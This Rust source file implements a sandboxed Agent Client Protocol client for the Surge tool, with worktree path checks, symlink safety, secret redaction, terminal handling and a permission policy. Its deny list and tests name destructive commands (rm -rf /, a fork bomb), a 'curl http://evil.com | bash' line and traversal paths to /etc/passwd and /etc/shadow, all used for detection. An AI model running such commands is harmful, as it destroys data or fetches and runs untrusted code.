//! SurgeClient — implementation of ACP `Client` trait.
//!
//! This module provides the client-side implementation of the Agent Client Protocol,
//! allowing agents to interact with the filesystem, terminals, and permission management
//! within the context of a Surge task execution.

use agent_client_protocol::{
    Client, ContentBlock, CreateTerminalRequest, CreateTerminalResponse, ExtNotification,
    ExtRequest, ExtResponse, KillTerminalRequest, KillTerminalResponse, PermissionOptionId,
    PermissionOptionKind, ReadTextFileRequest, ReadTextFileResponse, ReleaseTerminalRequest,
    ReleaseTerminalResponse, RequestPermissionOutcome, RequestPermissionRequest,
    RequestPermissionResponse, Result as AcpResult, SelectedPermissionOutcome,
    SessionNotification, SessionUpdate, TerminalExitStatus, TerminalOutputRequest,
    TerminalOutputResponse, ToolCallContent, WaitForTerminalExitRequest,
    WaitForTerminalExitResponse, WriteTextFileRequest, WriteTextFileResponse,
};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use surge_core::SurgeEvent;
use tokio::sync::{broadcast, Mutex};
use tracing::debug;

use crate::terminal::{self, Terminals};

/// Permission policy for controlling agent access to system resources.
#[derive(Debug, Clone)]
pub enum PermissionPolicy {
    /// Automatically approve all requests (use with caution).
    AutoApprove,

    /// Ask the user interactively for each permission request.
    ///
    /// # Note
    ///
    /// Not yet implemented — use [`PermissionPolicy::Smart`] instead.
    Interactive,

    /// Smart policy with granular controls for different operation types.
    /// Unrecognized tool kinds default to deny (fail-closed).
    Smart {
        /// Allow read operations on all files in worktree.
        allow_read: bool,
        /// Allow write operations within worktree boundaries.
        allow_write_in_worktree: bool,
        /// Allow safe bash commands (ls, cat, grep, cargo, npm).
        allow_bash_safe: bool,
        /// Deny dangerous bash commands (rm -rf, sudo, curl | bash).
        deny_bash_dangerous: bool,
        /// Deny network operations.
        deny_network: bool,
    },
}

impl Default for PermissionPolicy {
    fn default() -> Self {
        Self::Smart {
            allow_read: true,
            allow_write_in_worktree: true,
            allow_bash_safe: true,
            deny_bash_dangerous: true,
            deny_network: false,
        }
    }
}

/// Context for a specific subtask execution.
#[derive(Debug, Clone)]
pub struct SubtaskContext {
    /// Subtask identifier.
    pub subtask_id: String,

    /// Relevant file patterns for this subtask (for filtering).
    pub relevant_files: Vec<String>,
}

/// Implementation of ACP Client trait for Surge.
///
/// One instance per subtask execution, providing isolated access to filesystem,
/// terminals, and permission management within a git worktree.
pub struct SurgeClient {
    /// Root directory of the worktree for file operations.
    worktree_root: PathBuf,

    /// Canonicalized root for sandbox comparison.
    worktree_root_canonical: PathBuf,

    /// Permission policy for controlling agent access.
    permission_policy: PermissionPolicy,

    /// Channel for broadcasting events to UI/CLI.
    event_tx: Option<broadcast::Sender<SurgeEvent>>,

    /// Context of the current subtask (optional).
    subtask_context: Option<SubtaskContext>,

    /// Terminal process manager.
    terminals: Arc<Mutex<Terminals>>,
}

impl SurgeClient {
    /// Create a new SurgeClient instance.
    ///
    /// # Arguments
    ///
    /// * `worktree_root` - Root directory of the git worktree
    /// * `permission_policy` - Policy for controlling agent access
    #[must_use]
    pub fn new(worktree_root: PathBuf, permission_policy: PermissionPolicy) -> Self {
        let worktree_root_canonical = worktree_root
            .canonicalize()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    "Failed to canonicalize worktree root {}: {e}; sandbox path checks may be unreliable",
                    worktree_root.display()
                );
                worktree_root.clone()
            });
        let terminals = Arc::new(Mutex::new(Terminals::new(worktree_root.clone())));
        Self {
            worktree_root,
            worktree_root_canonical,
            permission_policy,
            event_tx: None,
            subtask_context: None,
            terminals,
        }
    }

    /// Set the event broadcaster for monitoring client operations.
    #[must_use]
    pub fn with_events(mut self, event_tx: broadcast::Sender<SurgeEvent>) -> Self {
        self.event_tx = Some(event_tx);
        self
    }

    /// Set the subtask context for filtering operations.
    #[must_use]
    pub fn with_subtask_context(mut self, context: SubtaskContext) -> Self {
        self.subtask_context = Some(context);
        self
    }

    /// Emit an event to subscribers.
    fn emit_event(&self, event: SurgeEvent) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(event);
        }
    }

    /// Resolve a path relative to worktree root, ensuring it stays within bounds.
    /// Handles both existing paths and new files (canonicalizes parent directory).
    fn resolve_path(&self, path: &Path) -> Result<PathBuf, String> {
        let absolute = if path.is_absolute() {
            path.to_path_buf()
        } else {
            self.worktree_root.join(path)
        };

        // Explicit symlink walk — defense-in-depth against symlinks that point
        // outside the worktree even when canonicalize would also catch them.
        Self::check_symlink_safety(&absolute, &self.worktree_root_canonical)?;

        // For existing paths, canonicalize directly.
        // For new files, canonicalize the parent and join the filename.
        let canonical = if absolute.exists() {
            absolute
                .canonicalize()
                .map_err(|e| format!("Cannot resolve path {}: {e}", path.display()))?
        } else {
            let parent = absolute
                .parent()
                .ok_or_else(|| format!("Path {} has no parent directory", path.display()))?;
            let canonical_parent = parent.canonicalize().map_err(|e| {
                format!("Cannot resolve parent of {}: {e}", path.display())
            })?;
            canonical_parent.join(
                absolute
                    .file_name()
                    .ok_or_else(|| format!("Path {} has no filename component", path.display()))?,
            )
        };

        if !canonical.starts_with(&self.worktree_root_canonical) {
            return Err(format!(
                "Path {} is outside worktree bounds",
                path.display()
            ));
        }

        Ok(canonical)
    }

    /// Walk each component of `path` and reject any symlink whose resolved
    /// target falls outside `allowed_root`.
    ///
    /// This is defense-in-depth on top of the canonicalize-based sandbox check:
    /// an attacker planting a symlink inside the worktree pointing to `/etc`
    /// is caught here before `canonicalize` is ever called.
    fn check_symlink_safety(path: &Path, allowed_root: &Path) -> Result<(), String> {
        let mut current = PathBuf::new();
        for component in path.components() {
            current.push(component);
            let meta = match std::fs::symlink_metadata(&current) {
                Ok(m) => m,
                Err(_) => continue, // component doesn't exist yet — can't be a symlink
            };
            if !meta.file_type().is_symlink() {
                continue;
            }
            let link_target = std::fs::read_link(&current).map_err(|e| {
                format!("Cannot read symlink {}: {e}", current.display())
            })?;
            // Resolve relative targets against the symlink's parent directory.
            let resolved = if link_target.is_absolute() {
                link_target
            } else {
                let parent = current.parent().unwrap_or(Path::new("/"));
                parent.join(&link_target)
            };
            let canonical_target = resolved.canonicalize().map_err(|_| {
                format!(
                    "Symlink {} has a non-existent or unresolvable target",
                    current.display()
                )
            })?;
            if !canonical_target.starts_with(allowed_root) {
                return Err(format!(
                    "Symlink {} points outside worktree bounds",
                    current.display()
                ));
            }
        }
        Ok(())
    }

    /// Check if a bash command is considered dangerous.
    fn is_dangerous_bash_command(command: &str) -> bool {
        let dangerous_patterns = [
            "rm -rf",
            "rm -fr",
            "sudo",
            "> /dev/",
            "mkfs",
            "dd if=",
            ":(){ :|:& };:", // fork bomb
        ];

        // Check for piping curl/wget to bash/sh
        let pipe_to_shell = (command.contains("curl") || command.contains("wget"))
            && command.contains('|')
            && (command.contains("bash") || command.contains("sh"));

        dangerous_patterns
            .iter()
            .any(|pattern| command.contains(pattern))
            || pipe_to_shell
    }

    /// Evaluate a permission request based on the configured policy.
    fn evaluate_permission(&self, request: &RequestPermissionRequest) -> Option<PermissionOptionId> {
        let should_approve = match &self.permission_policy {
            PermissionPolicy::AutoApprove => true,

            PermissionPolicy::Interactive => {
                todo!("Interactive permission policy: prompt the user and return their choice")
            }

            PermissionPolicy::Smart {
                allow_read,
                allow_write_in_worktree,
                allow_bash_safe,
                deny_bash_dangerous,
                deny_network: _deny_network,
            } => {
                // Extract tool title for heuristic classification
                let title = request
                    .tool_call
                    .fields
                    .title
                    .as_deref()
                    .unwrap_or("")
                    .to_lowercase();

                debug!(title = title.as_str(), "evaluating Smart permission");

                // Classify the operation based on tool title heuristics
                if title.contains("read") || title.contains("search") || title.contains("list") {
                    *allow_read
                } else if title.contains("write") || title.contains("edit") || title.contains("create file") {
                    *allow_write_in_worktree
                } else if title.contains("delete") || title.contains("remove file") {
                    // Delete operations always denied under Smart policy
                    false
                } else if title.contains("bash") || title.contains("terminal") || title.contains("command") || title.contains("execute") {
                    // Extract command from raw_input if available
                    let command = request
                        .tool_call
                        .fields
                        .raw_input
                        .as_ref()
                        .and_then(|v| v.get("command"))
                        .and_then(|v| v.as_str())
                        .unwrap_or("");

                    if *deny_bash_dangerous && Self::is_dangerous_bash_command(command) {
                        false
                    } else {
                        *allow_bash_safe
                    }
                } else if title.contains("fetch") || title.contains("network") || title.contains("http") {
                    !_deny_network && *allow_read
                } else if title.contains("mcp") || title.contains("tool") {
                    // MCP tool calls (crates.io, web search, etc.) — treat as read
                    *allow_read
                } else {
                    // Unknown operation type: fail closed
                    false
                }
            }
        };

        if should_approve {
            // Select the first allow-flavored option by typed kind
            request
                .options
                .iter()
                .find(|opt| {
                    matches!(
                        opt.kind,
                        PermissionOptionKind::AllowOnce | PermissionOptionKind::AllowAlways
                    )
                })
                .map(|opt| opt.option_id.clone())
        } else {
            None
        }
    }
}

// ── ACP type conversions ────────────────────────────────────────────

fn convert_tool_kind(kind: &agent_client_protocol::ToolKind) -> surge_core::ToolKind {
    match kind {
        agent_client_protocol::ToolKind::Read => surge_core::ToolKind::Read,
        agent_client_protocol::ToolKind::Edit => surge_core::ToolKind::Edit,
        agent_client_protocol::ToolKind::Delete => surge_core::ToolKind::Delete,
        agent_client_protocol::ToolKind::Move => surge_core::ToolKind::Move,
        agent_client_protocol::ToolKind::Search => surge_core::ToolKind::Search,
        agent_client_protocol::ToolKind::Execute => surge_core::ToolKind::Execute,
        agent_client_protocol::ToolKind::Think => surge_core::ToolKind::Think,
        agent_client_protocol::ToolKind::Fetch => surge_core::ToolKind::Fetch,
        agent_client_protocol::ToolKind::SwitchMode => surge_core::ToolKind::SwitchMode,
        _ => surge_core::ToolKind::Other,
    }
}

fn convert_tool_status(status: &agent_client_protocol::ToolCallStatus) -> surge_core::ToolCallStatus {
    match status {
        agent_client_protocol::ToolCallStatus::Pending => surge_core::ToolCallStatus::Pending,
        agent_client_protocol::ToolCallStatus::InProgress => surge_core::ToolCallStatus::InProgress,
        agent_client_protocol::ToolCallStatus::Completed => surge_core::ToolCallStatus::Completed,
        agent_client_protocol::ToolCallStatus::Failed => surge_core::ToolCallStatus::Failed,
        _ => surge_core::ToolCallStatus::Pending,
    }
}

fn convert_locations(locs: &[agent_client_protocol::ToolCallLocation]) -> Vec<surge_core::ToolLocation> {
    locs.iter()
        .map(|l| surge_core::ToolLocation {
            path: l.path.clone(),
            line: l.line,
        })
        .collect()
}

fn extract_diffs(content: &[ToolCallContent]) -> Vec<surge_core::ToolDiff> {
    content
        .iter()
        .filter_map(|c| {
            if let ToolCallContent::Diff(diff) = c {
                Some(surge_core::ToolDiff {
                    path: diff.path.clone(),
                    old_text: diff.old_text.clone(),
                    new_text: diff.new_text.clone(),
                })
            } else {
                None
            }
        })
        .collect()
}

fn convert_plan_priority(p: &agent_client_protocol::PlanEntryPriority) -> surge_core::PlanPriority {
    match p {
        agent_client_protocol::PlanEntryPriority::High => surge_core::PlanPriority::High,
        agent_client_protocol::PlanEntryPriority::Medium => surge_core::PlanPriority::Medium,
        agent_client_protocol::PlanEntryPriority::Low => surge_core::PlanPriority::Low,
        _ => surge_core::PlanPriority::Medium,
    }
}

fn convert_plan_status(s: &agent_client_protocol::PlanEntryStatus) -> surge_core::PlanStatus {
    match s {
        agent_client_protocol::PlanEntryStatus::Pending => surge_core::PlanStatus::Pending,
        agent_client_protocol::PlanEntryStatus::InProgress => surge_core::PlanStatus::InProgress,
        agent_client_protocol::PlanEntryStatus::Completed => surge_core::PlanStatus::Completed,
        _ => surge_core::PlanStatus::Pending,
    }
}

#[async_trait::async_trait(?Send)]
impl Client for SurgeClient {
    async fn request_permission(
        &self,
        args: RequestPermissionRequest,
    ) -> AcpResult<RequestPermissionResponse> {
        debug!("Permission requested: {:?}", args.tool_call);

        let description = args
            .tool_call
            .fields
            .title
            .clone()
            .unwrap_or_else(|| "Permission requested".to_string());

        let session_id = args.session_id.to_string();
        let tool_call_id = args.tool_call.tool_call_id.to_string();
        let option_names: Vec<String> = args.options.iter().map(|o| o.name.clone()).collect();

        self.emit_event(SurgeEvent::PermissionRequested {
            session_id: session_id.clone(),
            description: description.clone(),
            tool_call_id: tool_call_id.clone(),
            options: option_names,
        });

        let outcome = if let Some(option_id) = self.evaluate_permission(&args) {
            self.emit_event(SurgeEvent::PermissionResolved {
                session_id,
                granted: true,
            });
            RequestPermissionOutcome::Selected(SelectedPermissionOutcome::new(option_id))
        } else {
            self.emit_event(SurgeEvent::PermissionResolved {
                session_id,
                granted: false,
            });
            RequestPermissionOutcome::Cancelled
        };

        Ok(RequestPermissionResponse::new(outcome))
    }

    async fn session_notification(&self, args: SessionNotification) -> AcpResult<()> {
        let session_id = args.session_id.to_string();
        match args.update {
            SessionUpdate::AgentMessageChunk(chunk) => {
                if let ContentBlock::Text(text) = &chunk.content {
                    self.emit_event(SurgeEvent::AgentMessageChunk {
                        session_id,
                        text: text.text.clone(),
                    });
                }
            }
            SessionUpdate::AgentThoughtChunk(chunk) => {
                if let ContentBlock::Text(text) = &chunk.content {
                    self.emit_event(SurgeEvent::AgentThoughtChunk {
                        session_id,
                        text: text.text.clone(),
                    });
                }
            }
            SessionUpdate::ToolCall(tool_call) => {
                debug!(
                    session_id = session_id.as_str(),
                    tool = %tool_call.title,
                    kind = ?tool_call.kind,
                    "tool call initiated"
                );
                let raw_input = tool_call
                    .raw_input
                    .as_ref()
                    .and_then(|v| serde_json::to_string_pretty(v).ok());
                self.emit_event(SurgeEvent::ToolCallStarted {
                    session_id,
                    call_id: tool_call.tool_call_id.to_string(),
                    title: tool_call.title.clone(),
                    kind: convert_tool_kind(&tool_call.kind),
                    locations: convert_locations(&tool_call.locations),
                    raw_input,
                });
            }
            SessionUpdate::ToolCallUpdate(update) => {
                debug!(
                    session_id = session_id.as_str(),
                    tool_id = %update.tool_call_id,
                    status = ?update.fields.status,
                    "tool call updated"
                );
                let diffs = update
                    .fields
                    .content
                    .as_deref()
                    .map(extract_diffs)
                    .unwrap_or_default();
                let locations = update
                    .fields
                    .locations
                    .as_deref()
                    .map(convert_locations)
                    .unwrap_or_default();
                let raw_output = update
                    .fields
                    .raw_output
                    .as_ref()
                    .and_then(|v| serde_json::to_string_pretty(v).ok());
                self.emit_event(SurgeEvent::ToolCallUpdated {
                    session_id,
                    call_id: update.tool_call_id.to_string(),
                    status: update.fields.status.as_ref().map(convert_tool_status),
                    title: update.fields.title.clone(),
                    diffs,
                    locations,
                    raw_output,
                });
            }
            SessionUpdate::Plan(plan) => {
                debug!(
                    session_id = session_id.as_str(),
                    entries = plan.entries.len(),
                    "plan update received"
                );
                let entries = plan
                    .entries
                    .iter()
                    .map(|e| surge_core::PlanEntry {
                        content: e.content.clone(),
                        priority: convert_plan_priority(&e.priority),
                        status: convert_plan_status(&e.status),
                    })
                    .collect();
                self.emit_event(SurgeEvent::PlanUpdated {
                    session_id,
                    entries,
                });
            }
            SessionUpdate::UserMessageChunk(_) => {}
            SessionUpdate::AvailableCommandsUpdate(_) => {
                debug!(session_id = session_id.as_str(), "commands update received");
            }
            SessionUpdate::CurrentModeUpdate(mode) => {
                debug!(
                    session_id = session_id.as_str(),
                    mode = ?mode,
                    "session mode changed"
                );
            }
            // non_exhaustive — future ACP variants will trigger this
            #[allow(unreachable_patterns)]
            other => {
                debug!(
                    session_id = session_id.as_str(),
                    update = ?other,
                    "unhandled session update variant"
                );
            }
        }
        Ok(())
    }

    async fn read_text_file(&self, args: ReadTextFileRequest) -> AcpResult<ReadTextFileResponse> {
        let path = self.resolve_path(&args.path).map_err(|e| {
            agent_client_protocol::Error::new(-32603,
                format!("Failed to resolve path: {e}"),
            )
        })?;

        debug!("Reading file: {}", path.display());

        let raw_content: String = tokio::fs::read_to_string(&path).await.map_err(|e| {
            agent_client_protocol::Error::new(-32603,
                format!("Failed to read file: {e}"),
            )
        })?;

        // Redact credentials before they enter the LLM context.
        let (content, _) = crate::secrets::redact_secrets(&raw_content);

        self.emit_event(SurgeEvent::FileOperation {
            operation: "read".to_string(),
            path: path.clone(),
        });

        Ok(ReadTextFileResponse::new(content))
    }

    async fn write_text_file(
        &self,
        args: WriteTextFileRequest,
    ) -> AcpResult<WriteTextFileResponse> {
        // For new files, resolve parent first (resolve_path handles this)
        let path = self.resolve_path(&args.path).map_err(|e| {
            agent_client_protocol::Error::new(-32603,
                format!("Failed to resolve path: {e}"),
            )
        })?;

        debug!("Writing file: {}", path.display());

        // Warn if the agent is attempting to write content that looks like credentials.
        let (_, contains_secrets) = crate::secrets::redact_secrets(&args.content);
        if contains_secrets {
            tracing::warn!(
                path = %path.display(),
                "agent is writing content that matches secret patterns"
            );
        }

        // Ensure parent directory exists
        if let Some(parent) = path.parent() {
            let _: () = tokio::fs::create_dir_all(parent).await.map_err(|e| {
                agent_client_protocol::Error::new(-32603,
                    format!("Failed to create directory: {e}"),
                )
            })?;
        }

        let _: () = tokio::fs::write(&path, &args.content).await.map_err(|e| {
            agent_client_protocol::Error::new(-32603,
                format!("Failed to write file: {e}"),
            )
        })?;

        self.emit_event(SurgeEvent::FileOperation {
            operation: "write".to_string(),
            path: path.clone(),
        });

        Ok(WriteTextFileResponse::default())
    }

    async fn create_terminal(
        &self,
        args: CreateTerminalRequest,
    ) -> AcpResult<CreateTerminalResponse> {
        debug!("Creating terminal: {} {:?}", args.command, args.args);

        let env: Vec<(String, String)> = args
            .env
            .iter()
            .map(|e| (e.name.clone(), e.value.clone()))
            .collect();

        let terminal_id = self
            .terminals
            .lock()
            .await
            .spawn(
                &args.command,
                &args.args,
                &env,
                args.cwd.as_ref(),
                args.output_byte_limit,
            )
            .map_err(|e| {
                agent_client_protocol::Error::new(-32603,
                    format!("Terminal spawn failed: {e}"),
                )
            })?;

        self.emit_event(SurgeEvent::TerminalCreated {
            terminal_id: terminal_id.clone(),
            command: format!("{} {}", args.command, args.args.join(" ")),
        });

        Ok(CreateTerminalResponse::new(terminal_id))
    }

    async fn terminal_output(
        &self,
        args: TerminalOutputRequest,
    ) -> AcpResult<TerminalOutputResponse> {
        let terminal_id = args.terminal_id.to_string();

        let (output, _truncated, exit) =
            terminal::terminal_get_output(&self.terminals, &terminal_id)
                .await
                .map_err(|e| {
                    agent_client_protocol::Error::new(-32603,
                        format!("Terminal output failed: {e}"),
                    )
                })?;

        self.emit_event(SurgeEvent::TerminalOutput {
            terminal_id: terminal_id.clone(),
            output: output.clone(),
        });

        let exit_status = exit.map(|e| {
            TerminalExitStatus::new()
                .exit_code(e.exit_code)
                .signal(e.signal)
        });

        Ok(TerminalOutputResponse::new(output, _truncated)
            .exit_status(exit_status))
    }

    async fn release_terminal(
        &self,
        args: ReleaseTerminalRequest,
    ) -> AcpResult<ReleaseTerminalResponse> {
        let terminal_id = args.terminal_id.to_string();
        debug!(terminal_id = terminal_id.as_str(), "releasing terminal");

        terminal::terminal_release(&self.terminals, &terminal_id)
            .await
            .map_err(|e| {
                agent_client_protocol::Error::new(-32603,
                    format!("Terminal release failed: {e}"),
                )
            })?;

        Ok(ReleaseTerminalResponse::default())
    }

    async fn wait_for_terminal_exit(
        &self,
        args: WaitForTerminalExitRequest,
    ) -> AcpResult<WaitForTerminalExitResponse> {
        let terminal_id = args.terminal_id.to_string();
        debug!(terminal_id = terminal_id.as_str(), "waiting for terminal exit");

        let exit = terminal::terminal_wait_for_exit(&self.terminals, &terminal_id)
            .await
            .map_err(|e| {
                agent_client_protocol::Error::new(-32603,
                    format!("Terminal wait failed: {e}"),
                )
            })?;

        self.emit_event(SurgeEvent::TerminalExited {
            terminal_id: terminal_id.clone(),
            exit_code: exit.exit_code,
        });

        let status = TerminalExitStatus::new()
            .exit_code(exit.exit_code)
            .signal(exit.signal);

        Ok(WaitForTerminalExitResponse::new(status))
    }

    async fn kill_terminal(
        &self,
        args: KillTerminalRequest,
    ) -> AcpResult<KillTerminalResponse> {
        let terminal_id = args.terminal_id.to_string();
        debug!(terminal_id = terminal_id.as_str(), "killing terminal");

        terminal::terminal_kill(&self.terminals, &terminal_id)
            .await
            .map_err(|e| {
                agent_client_protocol::Error::new(-32603,
                    format!("Terminal kill failed: {e}"),
                )
            })?;

        self.emit_event(SurgeEvent::TerminalKilled {
            terminal_id,
        });

        Ok(KillTerminalResponse::default())
    }

    async fn ext_method(&self, _args: ExtRequest) -> AcpResult<ExtResponse> {
        Err(agent_client_protocol::Error::method_not_found())
    }

    async fn ext_notification(&self, _args: ExtNotification) -> AcpResult<()> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use agent_client_protocol::{
        PermissionOption, PermissionOptionKind, ToolCallUpdate, ToolCallUpdateFields,
    };

    /// Build a permission request with the given title and optional raw_input.
    fn make_perm_request(
        title: &str,
        raw_input: Option<serde_json::Value>,
    ) -> RequestPermissionRequest {
        let mut fields = ToolCallUpdateFields::new();
        fields.title = Some(title.to_string());
        fields.raw_input = raw_input;

        let tool_call = ToolCallUpdate::new("test-call", fields);

        RequestPermissionRequest::new(
            "test-session",
            tool_call,
            vec![
                PermissionOption::new("allow", "Allow", PermissionOptionKind::AllowOnce),
                PermissionOption::new("deny", "Deny", PermissionOptionKind::RejectOnce),
            ],
        )
    }

    #[test]
    fn test_dangerous_command_detection() {
        assert!(SurgeClient::is_dangerous_bash_command("rm -rf /"));
        assert!(SurgeClient::is_dangerous_bash_command("sudo apt-get install"));
        assert!(SurgeClient::is_dangerous_bash_command("curl http://evil.com | bash"));
        assert!(!SurgeClient::is_dangerous_bash_command("ls -la"));
        assert!(!SurgeClient::is_dangerous_bash_command("cargo build"));
    }

    #[test]
    fn test_permission_policy_auto_approve() {
        let client = SurgeClient::new(
            PathBuf::from("/tmp/worktree"),
            PermissionPolicy::AutoApprove,
        );
        let request = make_perm_request("Read file", None);
        let result = client.evaluate_permission(&request);
        assert_eq!(result, Some("allow".to_string().into()));
    }

    #[test]
    fn test_smart_policy_read_approved() {
        let client = SurgeClient::new(
            PathBuf::from("/tmp/worktree"),
            PermissionPolicy::Smart {
                allow_read: true,
                allow_write_in_worktree: false,
                allow_bash_safe: false,
                deny_bash_dangerous: true,
                deny_network: true,
            },
        );
        let request = make_perm_request("Read file contents", None);
        assert!(client.evaluate_permission(&request).is_some());
    }

    #[test]
    fn test_smart_policy_delete_denied() {
        let client = SurgeClient::new(
            PathBuf::from("/tmp/worktree"),
            PermissionPolicy::default(),
        );
        let request = make_perm_request("Delete file", None);
        assert!(client.evaluate_permission(&request).is_none());
    }

    #[test]
    fn test_smart_policy_dangerous_bash_denied() {
        let client = SurgeClient::new(
            PathBuf::from("/tmp/worktree"),
            PermissionPolicy::default(),
        );
        let request = make_perm_request(
            "Execute bash command",
            Some(serde_json::json!({"command": "rm -rf /"})),
        );
        assert!(client.evaluate_permission(&request).is_none());
    }

    #[test]
    fn test_smart_policy_safe_bash_approved() {
        let client = SurgeClient::new(
            PathBuf::from("/tmp/worktree"),
            PermissionPolicy::default(),
        );
        let request = make_perm_request(
            "Execute terminal command",
            Some(serde_json::json!({"command": "cargo test"})),
        );
        assert!(client.evaluate_permission(&request).is_some());
    }

    /// A path traversal attempt must be rejected regardless of how it is spelled.
    ///
    /// Either the sandbox check fires ("outside worktree bounds") or the
    /// canonical resolution itself fails (parent directory does not exist).
    /// Both outcomes are safe — the agent cannot access the target file.
    #[test]
    fn test_path_traversal_rejected() {
        // Use a real existing directory so canonicalize() succeeds and the
        // sandbox comparison is reliable.
        let worktree = std::env::temp_dir();
        let client = SurgeClient::new(worktree, PermissionPolicy::default());

        for attempt in &[
            "../../../etc/passwd",
            "subdir/../../../../../../etc/shadow",
            "/etc/passwd",
        ] {
            let result = client.resolve_path(std::path::Path::new(attempt));
            assert!(
                result.is_err(),
                "expected traversal '{attempt}' to be rejected, got Ok"
            );
        }
    }

    /// `SurgeClient::new` must not panic when the worktree root does not yet
    /// exist (canonicalize falls back with a warning). Subsequent `resolve_path`
    /// calls must return a clear error rather than silently succeeding or panicking.
    #[test]
    fn test_new_with_nonexistent_path_does_not_panic() {
        let client = SurgeClient::new(
            PathBuf::from("/nonexistent/surge/worktree"),
            PermissionPolicy::default(),
        );

        // resolve_path cannot canonicalize the parent either — expect an error.
        let result = client.resolve_path(std::path::Path::new("some_file.rs"));
        assert!(
            result.is_err(),
            "expected Err when worktree root does not exist"
        );
    }
}
